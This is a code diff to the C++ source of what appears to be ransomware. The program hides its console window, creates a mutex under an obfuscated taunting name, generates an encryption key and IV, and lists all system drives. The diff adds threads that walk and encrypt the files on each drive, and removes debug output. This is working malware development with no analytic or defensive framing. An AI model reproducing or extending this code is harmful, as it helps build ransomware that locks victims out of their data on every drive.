@@ -13,6 +13,8 @@
 
 int main(void) {
 
+	::ShowWindow(::GetConsoleWindow(), DEBUG);
+
 	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
 	if (ERROR_ALREADY_EXISTS == GetLastError()) {
 		return 1;
@@ -25,21 +27,18 @@ int main(void) {
 	prng.GenerateBlock(key.data(), key.size());
 	prng.GenerateBlock(iv.data(), iv.size());
 
-#if DEBUG
-	std::clog << "0x" << &key << " Allocated Buffer :  key " << sizeof(key) << std::endl;
-	std::clog << "0x" << &iv << " Allocated Buffer :  iv " << sizeof(iv) << std::endl;
-#endif
-
-
 	std::vector<std::thread> threads;
 	std::vector<DiskEncryptor> toEncrypt;
 	Systeme sys;
 	std::vector<std::string> drives = sys.getDrives();
 
-
 	for (std::string drive : drives) {
 		DiskEncryptor diskEncryptor(drive, key, iv);
 		toEncrypt.push_back(diskEncryptor);
+	}
+
+	for (DiskEncryptor& disk : toEncrypt) {
+		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
 	}
 
 	
